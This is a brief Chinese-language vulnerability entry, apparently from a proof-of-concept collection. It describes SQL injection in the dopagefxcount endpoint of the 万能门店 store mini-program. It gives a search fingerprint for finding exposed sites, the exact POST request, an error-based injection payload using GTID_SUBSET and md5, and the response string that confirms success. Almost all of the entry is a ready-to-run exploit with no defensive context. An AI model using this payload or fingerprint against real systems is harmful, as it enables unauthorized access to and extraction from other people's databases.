# 万能门店小程序dopagefxcount存在SQL注入漏洞

万能门店小程序 ｜ SQL注入 ｜ —
- **指纹**：`body="/comhome/cases/index.html"`
- **请求**：`POST /api/wxapps/dopagefxcount HTTP/1.1`

**Payload**
```
uniacid=1 OR GTID_SUBSET(CONCAT((SELECT(md5('123')))),3119)-- 123&suid=1
```
- **响应特征**：200 202cb962ac59075b964b07152d234b7